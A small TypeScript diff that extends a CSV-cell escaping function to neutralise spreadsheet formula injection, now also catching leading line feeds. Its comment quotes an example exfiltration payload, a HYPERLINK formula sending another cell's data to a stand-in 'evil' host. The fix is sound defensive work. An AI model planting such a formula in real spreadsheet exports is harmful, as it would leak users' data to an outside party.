@@ -3,13 +3,13 @@ import type { BusinessItem } from './types';
 
 /**
  * SEC-02: one CSV text cell. Business names, phones and e-mails are typed by whoever signs up, and Excel / Google
- * Sheets run a cell that starts with = + - @ (or a tab / carriage return) as a formula, even inside quotes, e.g.
+ * Sheets run a cell that starts with = + - @ (or a tab, carriage return or line feed) as a formula, even inside quotes, e.g.
  * =HYPERLINK("https://evil/?"&C3,"Open") would leak another business's data when the admin opens the file.
  * Such values get a leading apostrophe (shown as plain text); every cell is quoted with "" escaping.
  */
 export function csvCell(value: string | null | undefined): string {
   const text = value ?? '';
-  const safe = /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
+  const safe = /^[=+\-@\t\r\n]/.test(text) ? `'${text}` : text;
   return `"${safe.replace(/"/g, '""')}"`;
 }
 
